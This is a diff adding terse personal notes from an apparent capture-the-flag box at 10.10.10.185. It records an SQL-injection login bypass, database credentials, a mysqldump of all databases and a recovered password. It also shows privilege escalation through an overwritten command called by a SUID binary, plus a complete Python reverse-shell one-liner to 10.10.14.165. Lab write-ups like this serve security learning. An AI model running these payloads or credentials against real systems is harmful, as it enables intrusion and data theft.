@@ -35,3 +35,19 @@ magichex
 ' OR 1=1 --
 ----------------------------------------
 http://10.10.10.185/images/uploads/test.jpg
+Got shell found db.php5
+Got theseus and iamkingtheseus
+Couldn't login 
+so tried to get mysql but only sudo and not found 
+So found sqldump in usr/bin and used that 
+mysqldump --all-databases -u theseus -p got what I wanted
+Th3s3usW4sK1ng
+-----------------
+
+/bin/sysinfo user privileges
+
+Strings the file to get cat , fdisk and lshw
+
+Overwrite it 
+
+fdisk python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.165",3214));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
